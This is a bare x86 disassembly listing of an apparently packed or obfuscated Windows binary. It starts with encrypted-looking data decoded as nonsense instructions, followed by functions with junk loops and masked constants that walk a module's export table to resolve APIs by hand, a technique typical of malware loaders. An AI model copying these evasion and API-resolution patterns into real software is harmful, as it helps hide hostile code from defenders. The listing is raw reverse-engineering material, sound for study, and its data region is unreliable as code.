  404721:	sti    
  404722:	retf   0x40fd
  404725:	xor    DWORD PTR [edx-0x34],ebx
  404728:	icebp  
  404729:	fstp   TBYTE PTR [edi+0x24]
  40472c:	int3   
  40472d:	test   al,0x4c
  40472f:	shl    DWORD PTR [ecx],1
  404731:	ins    DWORD PTR es:[edi],dx
  404732:	mov    esi,0xf3ff1a0f
  404737:	std    
  404738:	cmp    eax,0xa7ef082b
  40473d:	jmp    0x40470c
  40473f:	popf   
  404740:	sub    DWORD PTR [edi],0xffffff94
  404743:	jb     0x4047a0
  404745:	and    eax,0x961337a0
  40474a:	add    BYTE PTR [ecx-0x58],ah
  40474d:	and    BYTE PTR [esp+ebp*2],bl
  404750:	dec    ebp
  404751:	aad    0x32
  404753:	stos   BYTE PTR es:[edi],al
  404754:	add    dl,al
  404756:	js     0x40478d
  404758:	push   ebx
  404759:	in     eax,0x4c
  40475b:	cmp    eax,0xf2f3201e
  404760:	mov    gs,WORD PTR [edx-0x2d]
  404763:	push   ecx
  404764:	clc    
  404765:	push   es
  404766:	mov    DWORD PTR [ecx+0x401f5d3a],0xbb831637
  404770:	mov    ds:0xc03bbf0b,eax
  404775:	fsubr  QWORD PTR [esi]
  404777:	dec    edi
  404778:	(bad)  
  404779:	adc    ch,ah
  40477b:	add    bl,BYTE PTR [edi]
  40477d:	sbb    DWORD PTR [esi-0x1dd6b94f],0x5eaf39b8
  404787:	pop    es
  404788:	inc    esp
  404789:	popf   
  40478a:	fnstcw WORD PTR [esi+0x52]
  40478d:	stos   DWORD PTR es:[edi],eax
  40478e:	adc    al,0x1f
  404790:	mov    ecx,0xb298cf4f
  404795:	mov    bl,0x72
  404797:	mov    al,ds:0x3e533d6
  40479c:	test   eax,0x6e23f421
  4047a1:	xor    ebp,ebp
  4047a3:	icebp  
  4047a4:	jp     0x404762
  4047a6:	call   0xd1a52a14
  4047ab:	dec    DWORD PTR [ebp-0x35]
  4047ae:	jne    0x404809
  4047b0:	ss dec ebx
  4047b2:	inc    esp
  4047b3:	pusha  
  4047b4:	dec    ebp
  4047b5:	inc    DWORD PTR [ebp-0x55a5a89]
  4047bb:	sbb    esi,edi
  4047bd:	aaa    
  4047be:	or     al,0x47
  4047c0:	add    al,0xc3
  4047c2:	pop    ss
  4047c3:	stc    
  4047c4:	sbb    eax,0x8f7848b2
  4047c9:	push   esp
  4047ca:	mov    BYTE PTR [esi+0x4e],al
  4047cd:	pushf  
  4047ce:	adc    ah,BYTE PTR [edx-0x73]
  4047d1:	add    al,0x3c
  4047d3:	sbb    DWORD PTR [bx+di-0x35],edi
  4047d7:	mov    esp,es
  4047d9:	lods   al,BYTE PTR ds:[esi]
  4047da:	add    cl,ch
  4047dc:	add    ebp,edi
  4047de:	into   
  4047df:	stos   BYTE PTR es:[edi],al
  4047e0:	leave  
  4047e1:	add    BYTE PTR [esi],cl
  4047e3:	fmul   DWORD PTR [eax]
  4047e5:	mov    eax,ds:0xfa785bff
  4047ea:	out    dx,al
  4047eb:	dec    esp
  4047ec:	daa    
  4047ed:	mov    ds:0x8a2519e9,al
  4047f2:	mov    ds:0xdd4e8925,eax
  4047f7:	push   esp
  4047f8:	jbe    0x4047d2
  4047fa:	dec    esp
  4047fb:	cld    
  4047fc:	mov    fs,WORD PTR [ebp+0x4d5c1830]
  404802:	add    ebp,DWORD PTR [eax]
  404804:	repnz popw ds
  404807:	adc    eax,DWORD PTR [ebx]
  404809:	mov    ah,0xde
  40480b:	cmc    
  40480c:	sbb    BYTE PTR [edx+0x17],al
  40480f:	push   esp
  404810:	cmp    ah,dh
  404812:	adc    edi,DWORD PTR [ebx+0x6fa4d3fa]
  404818:	mov    eax,ds:0x5dab3266
  40481d:	dec    edx
  40481e:	dec    ecx
  40481f:	cmp    bh,cl
  404821:	sub    edi,DWORD PTR [ebp+0x6745eeab]
  404827:	xchg   edi,esi
  404829:	jg     0x404825
  40482b:	sub    DWORD PTR [ecx-0x96d4d1],ebp
  404831:	(bad)  
  404832:	cmp    DWORD PTR [ebx+0x36],edi
  404835:	inc    ebp
  404836:	cmp    BYTE PTR [edi+eiz*8-0x49],ah
  40483a:	enter  0x6274,0x13
  40483e:	stc    
  40483f:	jl     0x40489e
  404841:	mov    WORD PTR [ecx+0x5e09e677],?
  404847:	xchg   ecx,eax
  404848:	jle    0x4047ee
  40484a:	jno    0x40485a
  40484c:	jns    0x40488c
  40484e:	mov    cl,0xb4
  404850:	and    al,BYTE PTR [eax]
  404852:	sub    dl,cl
  404854:	mov    esp,0xcd0c303e
  404859:	push   0x578087fa
  40485e:	inc    esi
  40485f:	div    ebp
  404861:	mov    esi,0xfc16783e
  404866:	mov    dh,BYTE PTR [edi]
  404868:	aaa    
  404869:	and    eax,ebp
  40486b:	js     0x40485b
  40486d:	sub    BYTE PTR [eax+0x28],bl
  404870:	fmul   st(6),st
  404872:	push   esi
  404873:	push   ebx
  404874:	cmp    eax,0xfb3a46be
  404879:	xchg   edi,eax
  40487a:	mov    ch,0xc4
  40487c:	sub    esi,esi
  40487e:	je     0x404802
  404880:	fisubr WORD PTR ds:0x251ee5c5
  404886:	(bad)  
  404887:	mov    dl,0x1f
  404889:	cmp    eax,0xcff676c9
  40488e:	sbb    BYTE PTR [edi],0x96
  404891:	jmp    0x8131:0xc7f56626
  404898:	xchg   BYTE PTR [ebp+0x49354c],al
  40489e:	(bad)
  4048a3:	xor    dh,BYTE PTR [ebx]
  4048a5:	add    BYTE PTR [ebp+0xaedba3a],al
  4048ab:	add    esi,DWORD PTR [esi+0xd428b2d]
  4048b1:	in     eax,dx
  4048b2:	int    0x60
  4048b4:	xchg   edx,eax
  4048b5:	mov    ah,0x7e
  4048b7:	loop   0x4048fd
  4048b9:	xchg   DWORD PTR [eax-0x38],ecx
  4048bc:	(bad)  
  4048bd:	sub    bl,BYTE PTR [eax+0x33a86636]
  4048c3:	stos   DWORD PTR es:[edi],eax
  4048c4:	(bad)  
  4048c5:	mov    eax,DWORD PTR [edi+0x59eb26c0]
  4048cb:	lds    ebx,FWORD PTR [edi-0x15e3d10e]
  4048d1:	adc    ebp,DWORD PTR [ebx+0x7e]
  4048d4:	and    al,0xf7
  4048d6:	mov    bh,0x4
  4048d8:	fs ja  0x404923
  4048db:	lahf   
  4048dc:	cwde   
  4048dd:	fs enter 0x5674,0xc2
  4048e2:	sti    
  4048e3:	mov    dh,0x98
  4048e5:	cmp    BYTE PTR [ebx-0x654084d2],0x43
  4048ec:	inc    ecx
  4048ed:	pop    ss
  4048ee:	sub    ah,BYTE PTR [esi-0x358a31b0]
  4048f4:	jns    0x4048a1
  4048f6:	test   DWORD PTR [edx],ebp
  4048f8:	or     eax,0x35cd8b19
  4048fd:	push   ebp
  4048fe:	cs (bad) 
  404900:	fistp  QWORD PTR [edi]
  404902:	in     eax,0x37
  404904:	cwde   
  404905:	out    dx,eax
  404906:	xchg   edx,eax
  404907:	idiv   edx
  404909:	xchg   ecx,eax
  40490a:	mov    cl,0xd7
  40490c:	out    dx,eax
  40490d:	xchg   edx,eax
  40490e:	out    0x6c,al
  404910:	add    bl,0x9e
  404913:	adc    ebp,ebx
  404915:	jmp    0x404897
  404917:	pop    ecx
  404918:	or     DWORD PTR [esi+ebx*1-0x53652c55],esi
  40491f:	xchg   edi,eax
  404920:	inc    esi
  404921:	or     ch,dl
  404923:	imul   ecx,ebp,0x5c54340a
  404929:	pop    es
  40492a:	sbb    DWORD PTR [ebp+0x6cfeafb8],ecx
  404930:	mov    edi,0xa52aa717
  404935:	cld    
  404936:	mov    ecx,eax
  404938:	aaa    
  404939:	in     eax,dx
  40493a:	sbb    ecx,DWORD PTR [edx+0x6e]
  40493d:	bound  ebp,QWORD PTR [edi]
  40493f:	mov    bl,0xbe
  404941:	mov    ch,0x6d
  404943:	std    
  404944:	std    
  404945:	call   0xe787:0xa0bb0f26
  40494c:	add    ebx,DWORD PTR [esp+eiz*8+0x39]
  404950:	mov    al,ds:0xc0bdea4c
  404955:	les    ebx,FWORD PTR [eax]
  404957:	ds xor eax,esp
  40495a:	jmp    0x4049a9
  40495c:	jno    0x40493a
  40495e:	clc    
  40495f:	aam    0xfd
  404961:	scas   eax,DWORD PTR es:[edi]
  404962:	or     DWORD PTR [ecx-0x13],0xffffff9d
  404966:	out    0xeb,al
  404968:	out    dx,al
  404969:	sbb    ch,0x90
  40496c:	call   0x6d745f99
  404971:	cs pop edx
  404973:	cwde   
  404974:	mov    bl,0x8e
  404976:	jmp    0xbc9c1e5a
  40497b:	mov    cl,BYTE PTR ds:0x9114098f
  404981:	sub    eax,0xaf1a6d26
  404986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404987:	and    DWORD PTR [esi],esp
  404989:	gs dec ebx
  40498b:	xor    BYTE PTR [esp+esi*1-0x31],0x7c
  404990:	imul   edx,DWORD PTR [ebx],0x6db65104
  404996:	push   esi
  404997:	or     esi,0x64f0
  40499d:	mov    edx,0x751089b
  4049a2:	add    DWORD PTR ds:0x435018,0x3361
  4049ac:	xor    ecx,edx
  4049ae:	and    DWORD PTR ds:0x435010,0x0
  4049b8:	xor    esi,esi
  4049ba:	or     esi,DWORD PTR ds:0x435010
  4049c0:	inc    esi
  4049c1:	mov    DWORD PTR ds:0x435010,esi
  4049c7:	cmp    DWORD PTR ds:0x435010,0xb
  4049ce:	jl     0x404a0b
  4049d4:	jmp    0x4049e4
  4049d9:	push   0x1955
  4049de:	call   DWORD PTR ds:0x43a8c4
  4049e4:	cmp    DWORD PTR ds:0x435010,0xa
  4049eb:	jne    0x4049fe
  4049f1:	mov    esi,DWORD PTR ds:0x435010
  4049f7:	inc    esi
  4049f8:	mov    DWORD PTR ds:0x435010,esi
  4049fe:	cmp    DWORD PTR ds:0x435010,0x1c
  404a05:	jb     0x4049b8
  404a0b:	mov    esi,0x3272e2
  404a10:	or     DWORD PTR ds:0x436018,0x436014
  404a1a:	push   edi
  404a1b:	add    edi,DWORD PTR ds:0x43800c
  404a21:	mov    edi,DWORD PTR [ebp+0x10]
  404a24:	add    ecx,esi
  404a26:	mov    DWORD PTR ds:0x43500c,0x38f3
  404a30:	cmp    ecx,edi
  404a32:	mov    DWORD PTR ds:0x43401c,0x3286
  404a3c:	je     0x404b8f
  404a42:	mov    ecx,DWORD PTR [ebp-0x4]
  404a45:	sbb    edi,DWORD PTR ds:0x435014
  404a4b:	mov    edi,DWORD PTR [ebp+0x10]
  404a4e:	xor    eax,eax
  404a50:	xor    DWORD PTR ds:0x435018,0x434028
  404a5a:	xor    ecx,edx
  404a5c:	add    ecx,esi
  404a5e:	mov    DWORD PTR ds:0x434024,0x7740
  404a68:	add    edi,0xfabdbee7
  404a6e:	adc    eax,0xffffffff
  404a71:	inc    DWORD PTR ds:0x437010
  404a77:	xor    eax,0x0
  404a7a:	or     DWORD PTR ds:0x438008,0x434024
  404a84:	mov    DWORD PTR [ebp-0xc],eax
  404a87:	push   ebx
  404a88:	xor    ebx,ebx
  404a8a:	adc    DWORD PTR ds:0x43400c,0x682
  404a94:	xor    edi,0x8a29a12d
  404a9a:	mov    DWORD PTR ds:0x436008,0x12
  404aa4:	cmp    DWORD PTR ds:0x436008,0x0
  404aab:	je     0x404af4
  404ab1:	cmp    DWORD PTR ds:0x436008,0x3
  404ab8:	jle    0x404af4
  404abe:	jmp    0x404acc
  404ac3:	push   DWORD PTR [ebp-0x18]
  404ac6:	call   DWORD PTR ds:0x43a8c8
  404acc:	cmp    DWORD PTR ds:0x436008,0x4
  404ad3:	jne    0x404ae4
  404ad9:	mov    eax,ds:0x436008
  404ade:	dec    eax
  404adf:	mov    ds:0x436008,eax
  404ae4:	mov    eax,ds:0x436008
  404ae9:	dec    eax
  404aea:	mov    ds:0x436008,eax
  404aef:	jmp    0x404aa4
  404af4:	mov    eax,ecx
  404af6:	add    eax,0xfabdbee7
  404afb:	adc    ebx,0xffffffff
  404afe:	xor    eax,0x8a29a12d
  404b03:	xor    ebx,0x0
  404b06:	cmp    eax,edi
  404b08:	jne    0x404b21
  404b0e:	cmp    ebx,DWORD PTR [ebp-0xc]
  404b11:	je     0x404b89
  404b17:	jmp    0x404b21
  404b1c:	mov    esi,0x3272e2
  404b21:	mov    eax,DWORD PTR [ebp-0x4]
  404b24:	mov    edi,DWORD PTR [ebp-0x8]
  404b27:	xor    edi,edx
  404b29:	add    edi,esi
  404b2b:	mov    esi,DWORD PTR [ebp+0x8]
  404b2e:	imul   edi,ecx
  404b31:	mov    ebx,DWORD PTR [ebp+0xc]
  404b34:	xor    eax,edx
  404b36:	add    eax,ecx
  404b38:	mov    al,BYTE PTR [ebx+eax*1+0x3272e2]
  404b3f:	mov    BYTE PTR [edi+esi*1],al
  404b42:	mov    eax,DWORD PTR [ebp-0x8]
  404b45:	mov    esi,DWORD PTR [ebp+0x10]
  404b48:	xor    eax,edx
  404b4a:	xor    ebx,ebx
  404b4c:	add    esi,0xfabdbee7
  404b52:	adc    ebx,0xffffffff
  404b55:	lea    ecx,[ecx+eax*1+0x3272e2]
  404b5c:	xor    edi,edi
  404b5e:	xor    esi,0x8a29a12d
  404b64:	xor    ebx,0x0
  404b67:	mov    eax,ecx
  404b69:	add    eax,0xfabdbee7
  404b6e:	adc    edi,0xffffffff
  404b71:	xor    eax,0x8a29a12d
  404b76:	xor    edi,0x0
  404b79:	cmp    eax,esi
  404b7b:	jne    0x404b1c
  404b81:	cmp    edi,ebx
  404b83:	jne    0x404b1c
  404b89:	mov    eax,0xf89c8584
  404b8e:	pop    ebx
  404b8f:	pop    edi
  404b90:	pop    esi
  404b91:	leave  
  404b92:	ret    0xc
  404b95:	push   ebp
  404b96:	mov    ebp,esp
  404b98:	push   ecx
  404b99:	add    DWORD PTR ds:0x43701c,0x56ef
  404ba3:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  404baa:	mov    eax,DWORD PTR [ebp+0x8]
  404bad:	movsx  eax,BYTE PTR [eax]
  404bb0:	and    DWORD PTR ds:0x436004,0x0
  404bba:	mov    ecx,DWORD PTR ds:0x436004
  404bc0:	inc    ecx
  404bc1:	mov    DWORD PTR ds:0x436004,ecx
  404bc7:	cmp    DWORD PTR ds:0x436004,0x6
  404bce:	ja     0x404c0b
  404bd4:	jmp    0x404be4
  404bd9:	push   0x43a0c9
  404bde:	call   DWORD PTR ds:0x43a8d0
  404be4:	cmp    DWORD PTR ds:0x436004,0x5
  404beb:	jne    0x404bfe
  404bf1:	mov    ecx,DWORD PTR ds:0x436004
  404bf7:	inc    ecx
  404bf8:	mov    DWORD PTR ds:0x436004,ecx
  404bfe:	cmp    DWORD PTR ds:0x436004,0x18
  404c05:	jb     0x404bba
  404c0b:	mov    edx,0x3272e2
  404c10:	neg    ecx
  404c12:	sub    eax,edx
  404c14:	mov    ecx,0x751089b
  404c19:	xor    eax,ecx
  404c1b:	mov    DWORD PTR ds:0x43600c,0x18ff
  404c25:	cmp    eax,0xf89c85f0
  404c2a:	jne    0x404c59
  404c30:	mov    eax,DWORD PTR [ebp+0x8]
  404c33:	push   esi
  404c34:	mov    esi,DWORD PTR [ebp+0x8]
  404c37:	add    esi,DWORD PTR [eax+0x3c]
  404c3a:	mov    DWORD PTR [ebp+0x8],esi
  404c3d:	mov    eax,DWORD PTR [ebp-0x4]
  404c40:	mov    esi,DWORD PTR [ebp+0x8]
  404c43:	xor    eax,ecx
  404c45:	add    eax,edx
  404c47:	cmp    DWORD PTR [esi+0x54],eax
  404c4a:	pop    esi
  404c4b:	je     0x404c59
  404c51:	mov    eax,DWORD PTR [ebp+0x8]
  404c54:	jmp    0x404c60
  404c59:	mov    eax,DWORD PTR [ebp-0x4]
  404c5c:	xor    eax,ecx
  404c5e:	add    eax,edx
  404c60:	leave  
  404c61:	ret    0x4
  404c64:	push   ebp
  404c65:	mov    ebp,esp
  404c67:	sub    esp,0x38
  404c6a:	or     DWORD PTR ds:0x43500c,0x434024
  404c74:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  404c7b:	mov    eax,ds:0x437004
  404c80:	or     DWORD PTR ds:0x434004,eax
  404c86:	push   ebx
  404c87:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  404c8e:	adc    DWORD PTR ds:0x434020,edi
  404c94:	mov    eax,DWORD PTR [ebp-0x4]
  404c97:	xor    DWORD PTR ds:0x437018,0x773f
  404ca1:	push   esi
  404ca2:	xor    DWORD PTR ds:0x435010,0x4a66
  404cac:	mov    esi,0x751089b
  404cb1:	and    DWORD PTR ds:0x435018,0x354c
  404cbb:	xor    eax,esi
  404cbd:	not    DWORD PTR ds:0x436018
  404cc3:	push   edi
  404cc4:	mov    edi,0x3272e2
  404cc9:	add    eax,edi
  404ccb:	xor    DWORD PTR ds:0x434018,0x434000
  404cd5:	mov    DWORD PTR [ebp-0x1c],eax
  404cd8:	and    DWORD PTR ds:0x438010,0x0
  404ce2:	mov    eax,ds:0x438010
  404ce7:	inc    eax
  404ce8:	mov    ds:0x438010,eax
  404ced:	cmp    DWORD PTR ds:0x438010,0xb
  404cf4:	jb     0x404d2f
  404cfa:	jmp    0x404d0a
  404cff:	push   0x43a097
  404d04:	call   DWORD PTR ds:0x43a8d4
  404d0a:	cmp    DWORD PTR ds:0x438010,0xa
  404d11:	jne    0x404d22
  404d17:	mov    eax,ds:0x438010
  404d1c:	inc    eax
  404d1d:	mov    ds:0x438010,eax
  404d22:	cmp    DWORD PTR ds:0x438010,0x14
  404d29:	jb     0x404ce2
  404d2f:	mov    eax,DWORD PTR [ebp+0x14]
  404d32:	sbb    DWORD PTR ds:0x437008,0x2430
  404d3c:	test   eax,eax
  404d3e:	je     0x404d99
  404d44:	and    DWORD PTR ds:0x438000,edx
  404d4a:	mov    eax,DWORD PTR [ebp+0x14]
  404d4d:	and    DWORD PTR ds:0x435014,0x0
  404d57:	xor    ebx,ebx
  404d59:	add    ebx,DWORD PTR ds:0x435014
  404d5f:	inc    ebx
  404d60:	mov    DWORD PTR ds:0x435014,ebx
  404d66:	cmp    DWORD PTR ds:0x435014,0x29
  404d6d:	jl     0x404d8e
  404d73:	jmp    0x404d81
  404d78:	push   DWORD PTR [ebp-0x24]
  404d7b:	call   DWORD PTR ds:0x43a8dc
  404d81:	cmp    DWORD PTR ds:0x435014,0x1a
  404d88:	jb     0x404d57
  404d8e:	mov    eax,DWORD PTR [eax]
  404d90:	or     ebx,DWORD PTR ds:0x438014
  404d96:	mov    DWORD PTR [ebp-0x1c],eax
  404d99:	or     DWORD PTR ds:0x436008,0x1828
  404da3:	mov    eax,DWORD PTR [ebp-0x4]
  404da6:	adc    DWORD PTR ds:0x437014,edi
  404dac:	xor    eax,esi
  404dae:	xor    ebx,ebx
  404db0:	or     ebx,DWORD PTR ds:0x436018
  404db6:	xor    DWORD PTR ds:0x434004,ebx
  404dbc:	add    eax,edi
  404dbe:	mov    DWORD PTR [ebp-0x8],eax
  404dc1:	add    DWORD PTR ds:0x43601c,0x710e
  404dcb:	mov    eax,DWORD PTR [ebp-0xc]
  404dce:	xor    ebx,ebx
  404dd0:	add    ebx,DWORD PTR ds:0x438008
  404dd6:	and    DWORD PTR ds:0x438018,ebx
  404ddc:	xor    eax,esi
  404dde:	and    DWORD PTR ds:0x438010,0x0
  404de8:	xor    ebx,ebx
  404dea:	add    ebx,DWORD PTR ds:0x438010
  404df0:	inc    ebx
  404df1:	mov    DWORD PTR ds:0x438010,ebx
  404df7:	cmp    DWORD PTR ds:0x438010,0x29
  404dfe:	jg     0x404e2c
  404e04:	jmp    0x404e1f
  404e09:	push   0x43a097
  404e0e:	push   DWORD PTR [ebp-0x24]
  404e11:	push   0x5041
  404e16:	push   DWORD PTR [ebp-0x1c]
  404e19:	call   DWORD PTR ds:0x43a8e0
  404e1f:	cmp    DWORD PTR ds:0x438010,0x1d
  404e26:	jb     0x404de8
  404e2c:	add    eax,edi
  404e2e:	movzx  ebx,WORD PTR ds:0x434018
  404e35:	sbb    ebx,DWORD PTR ds:0x434000
  404e3b:	mov    DWORD PTR ds:0x434018,ebx
  404e41:	mov    DWORD PTR [ebp-0x24],eax
  404e44:	mov    eax,DWORD PTR [ebp-0x4]
  404e47:	and    DWORD PTR ds:0x437004,edx
  404e4d:	xor    eax,esi
  404e4f:	add    eax,edi
  404e51:	add    DWORD PTR ds:0x43600c,0x546e
  404e5b:	mov    DWORD PTR [ebp-0x30],eax
  404e5e:	sub    eax,ebx
  404e60:	mov    ebx,DWORD PTR [ebp-0x4]
  404e63:	sub    DWORD PTR ds:0x435008,0x4ecf
  404e6d:	xor    ebx,esi
  404e6f:	sub    DWORD PTR ds:0x436004,edx
  404e75:	add    ebx,edi
  404e77:	adc    DWORD PTR ds:0x438000,0x4ed2
  404e81:	mov    eax,DWORD PTR [ebp-0x24]
  404e84:	xor    DWORD PTR ds:0x435018,0x43700c
  404e8e:	sub    eax,edi
  404e90:	lea    ecx,[ebx-0x3272e2]
  404e96:	xor    eax,esi
  404e98:	adc    DWORD PTR ds:0x436010,0x436014
  404ea2:	xor    ecx,esi
  404ea4:	mov    DWORD PTR ds:0x438004,0x37e0
  404eae:	cmp    ecx,eax
  404eb0:	mov    DWORD PTR ds:0x437000,0x70b7
  404eba:	je     0x4051ec
  404ec0:	and    DWORD PTR ds:0x43701c,0x0
  404eca:	xor    eax,eax
  404ecc:	or     eax,DWORD PTR ds:0x43701c
  404ed2:	inc    eax
  404ed3:	mov    ds:0x43701c,eax
  404ed8:	cmp    DWORD PTR ds:0x43701c,0x6
  404edf:	ja     0x404f2d
  404ee5:	jmp    0x404f08
  404eea:	push   DWORD PTR [ebp-0xc]
  404eed:	push   0x434024
  404ef2:	push   DWORD PTR [ebp-0x10]
  404ef5:	push   0x43a000
  404efa:	push   0x794f
  404eff:	push   DWORD PTR [ebp-0x28]
  404f02:	call   DWORD PTR ds:0x43a8e4
  404f08:	cmp    DWORD PTR ds:0x43701c,0x5
  404f0f:	jne    0x404f20
  404f15:	mov    eax,ds:0x43701c
  404f1a:	inc    eax
  404f1b:	mov    ds:0x43701c,eax
  404f20:	cmp    DWORD PTR ds:0x43701c,0x10
  404f27:	jb     0x404eca
  404f2d:	mov    eax,DWORD PTR [ebp-0x4]
  404f30:	xor    eax,esi
  404f32:	sub    DWORD PTR ds:0x435000,0x434020
  404f3c:	add    eax,edi
  404f3e:	cmp    ebx,eax
  404f40:	jne    0x4051c9
  404f46:	adc    DWORD PTR ds:0x437008,0x435000
  404f50:	push   DWORD PTR [ebp+0x8]
  404f53:	adc    DWORD PTR ds:0x43600c,0x30f1
  404f5d:	call   0x404b95
  404f62:	mov    ecx,DWORD PTR ds:0x437010
  404f68:	sub    DWORD PTR ds:0x434024,ecx
  404f6e:	mov    DWORD PTR [ebp-0x14],eax
  404f71:	and    DWORD PTR ds:0x437014,0x0
  404f7b:	mov    eax,ds:0x437014
  404f80:	inc    eax
  404f81:	mov    ds:0x437014,eax
  404f86:	cmp    DWORD PTR ds:0x437014,0x5
  404f8d:	jl     0x404fd1
  404f93:	jmp    0x404fac
  404f98:	push   DWORD PTR [ebp-0x1c]
  404f9b:	push   0x89c7
  404fa0:	push   DWORD PTR [ebp-0x20]
  404fa3:	push   DWORD PTR [ebp-0x28]
  404fa6:	call   DWORD PTR ds:0x43a8e8
  404fac:	cmp    DWORD PTR ds:0x437014,0x4
  404fb3:	jne    0x404fc4
  404fb9:	mov    eax,ds:0x437014
  404fbe:	inc    eax
  404fbf:	mov    ds:0x437014,eax
  404fc4:	cmp    DWORD PTR ds:0x437014,0x1b
  404fcb:	jb     0x404f7b
  404fd1:	mov    eax,DWORD PTR [ebp-0x4]
  404fd4:	add    ecx,0x29bc
  404fda:	mov    ecx,DWORD PTR [ebp-0x14]
  404fdd:	or     DWORD PTR ds:0x43401c,0x7fb4
  404fe7:	xor    eax,esi
  404fe9:	add    eax,edi
  404feb:	cmp    ecx,eax
  404fed:	je     0x405257
  404ff3:	push   DWORD PTR [ebp-0x14]
  404ff6:	and    DWORD PTR ds:0x438000,0x39ab
  405000:	push   DWORD PTR [ebp+0x8]
  405003:	xor    DWORD PTR ds:0x437010,0x438000
  40500d:	call   0x40a3b2
  405012:	sbb    DWORD PTR ds:0x438014,0x3483
  40501c:	mov    DWORD PTR [ebp-0x14],eax
  40501f:	or     ecx,0x551e
  405025:	mov    eax,DWORD PTR [ebp-0x4]
  405028:	mov    ecx,DWORD PTR ds:0x434010
  40502e:	or     DWORD PTR ds:0x437014,ecx
  405034:	mov    ecx,DWORD PTR [ebp-0x14]
  405037:	sub    DWORD PTR ds:0x43801c,0xa60
  405041:	xor    eax,esi
  405043:	add    eax,edi
  405045:	mov    DWORD PTR ds:0x435004,0x1802
  40504f:	cmp    ecx,eax
  405051:	je     0x405257
  405057:	mov    DWORD PTR ds:0x43701c,0x15
  405061:	cmp    DWORD PTR ds:0x43701c,0x0
  405068:	je     0x4050b4
  40506e:	cmp    DWORD PTR ds:0x43701c,0xa
  405075:	jb     0x4050b4
  40507b:	jmp    0x405086
  405080:	call   DWORD PTR ds:0x43a8f0
  405086:	cmp    DWORD PTR ds:0x43701c,0xb
  40508d:	jne    0x4050a0
  405093:	mov    ecx,DWORD PTR ds:0x43701c
  405099:	dec    ecx
  40509a:	mov    DWORD PTR ds:0x43701c,ecx
  4050a0:	xor    ecx,ecx
  4050a2:	or     ecx,DWORD PTR ds:0x43701c
  4050a8:	dec    ecx
  4050a9:	mov    DWORD PTR ds:0x43701c,ecx
  4050af:	jmp    0x405061
  4050b4:	mov    eax,DWORD PTR [ebp-0x14]
  4050b7:	sub    DWORD PTR ds:0x436010,edi
  4050bd:	mov    eax,DWORD PTR [eax+0x18]
  4050c0:	adc    DWORD PTR ds:0x436000,ebx
  4050c6:	mov    DWORD PTR [ebp-0x24],eax
  4050c9:	mov    DWORD PTR ds:0x434028,0x1f
  4050d3:	cmp    DWORD PTR ds:0x434028,0x0
  4050da:	je     0x40510b
  4050e0:	cmp    DWORD PTR ds:0x434028,0x27
  4050e7:	jl     0x40510b
  4050ed:	jmp    0x4050fb
  4050f2:	push   DWORD PTR [ebp-0x14]
  4050f5:	call   DWORD PTR ds:0x43a8f4
  4050fb:	mov    eax,ds:0x434028
  405100:	dec    eax
  405101:	mov    ds:0x434028,eax
  405106:	jmp    0x4050d3
  40510b:	mov    eax,DWORD PTR [ebp-0x14]
  40510e:	or     ecx,0x2a6b
  405114:	mov    ecx,DWORD PTR [ebp+0x8]
  405117:	xor    DWORD PTR ds:0x438000,0x69f8
  405121:	add    ecx,DWORD PTR [eax+0x20]
  405124:	sbb    DWORD PTR ds:0x436014,0x3915
  40512e:	mov    DWORD PTR [ebp-0x2c],ecx
  405131:	mov    eax,DWORD PTR [ebp-0x14]
  405134:	mov    ecx,DWORD PTR ds:0x43700c
  40513a:	xor    DWORD PTR ds:0x434008,ecx
  405140:	mov    ecx,DWORD PTR [ebp+0x8]
  405143:	add    ecx,DWORD PTR [eax+0x24]
  405146:	xor    eax,eax
  405148:	add    eax,DWORD PTR ds:0x434008
  40514e:	xor    DWORD PTR ds:0x437014,eax
  405154:	mov    DWORD PTR [ebp-0x34],ecx
  405157:	mov    DWORD PTR ds:0x438000,0x1b
  405161:	cmp    DWORD PTR ds:0x438000,0x0
  405168:	je     0x4051b8
  40516e:	cmp    DWORD PTR ds:0x438000,0x3
  405175:	jbe    0x4051b8
  40517b:	jmp    0x40518c
  405180:	push   DWORD PTR [ebp-0x28]
  405183:	push   DWORD PTR [ebp-0xc]
  405186:	call   DWORD PTR ds:0x43a8f8
  40518c:	cmp    DWORD PTR ds:0x438000,0x4
  405193:	jne    0x4051a6
  405199:	mov    ecx,DWORD PTR ds:0x438000
  40519f:	dec    ecx
  4051a0:	mov    DWORD PTR ds:0x438000,ecx
  4051a6:	mov    ecx,DWORD PTR ds:0x438000
  4051ac:	dec    ecx
  4051ad:	mov    DWORD PTR ds:0x438000,ecx
  4051b3:	jmp    0x405161
  4051b8:	mov    eax,DWORD PTR [ebp-0x14]
  4051bb:	mov    ecx,DWORD PTR [ebp+0x8]
  4051be:	add    ecx,DWORD PTR [eax+0x1c]
  4051c1:	mov    DWORD PTR [ebp-0x14],ecx
  4051c4:	jmp    0x40521f
  4051c9:	mov    eax,DWORD PTR [ebp-0x2c]
  4051cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4051cf:	add    ecx,DWORD PTR [eax+ebx*4]
  4051d2:	mov    DWORD PTR [ebp-0x28],ecx
  4051d5:	mov    eax,DWORD PTR [ebp-0x4]
  4051d8:	mov    ecx,DWORD PTR [ebp-0x28]
  4051db:	xor    eax,esi
  4051dd:	add    eax,edi
  4051df:	cmp    ecx,eax
  4051e1:	je     0x40521f
  4051e7:	jmp    0x405210
  4051ec:	mov    eax,DWORD PTR [ebp-0x4]
  4051ef:	mov    ecx,DWORD PTR [ebp-0x8]
  4051f2:	xor    eax,esi
  4051f4:	add    eax,edi
  4051f6:	cmp    ecx,eax
  4051f8:	mov    eax,DWORD PTR [ebp-0x4]
  4051fb:	je     0x40525a
  405201:	mov    ecx,DWORD PTR [ebp-0x30]
  405204:	xor    eax,esi
  405206:	add    eax,edi
  405208:	cmp    ecx,eax
  40520a:	je     0x405263
  405210:	lea    eax,[ebp-0x8]
  405213:	push   eax
  405214:	push   DWORD PTR [ebp-0x28]
  405217:	push   DWORD PTR [ebp+0xc]
  40521a:	call   0x40a667
  40521f:	mov    eax,DWORD PTR [ebp-0x4]
  405222:	mov    ecx,DWORD PTR [ebp-0x8]
  405225:	xor    eax,esi
  405227:	add    eax,edi
  405229:	cmp    ecx,eax
  40522b:	je     0x405246
  405231:	mov    eax,DWORD PTR [ebp-0x34]
  405234:	movzx  eax,WORD PTR [eax+ebx*2]
  405238:	mov    ecx,DWORD PTR [ebp-0x14]
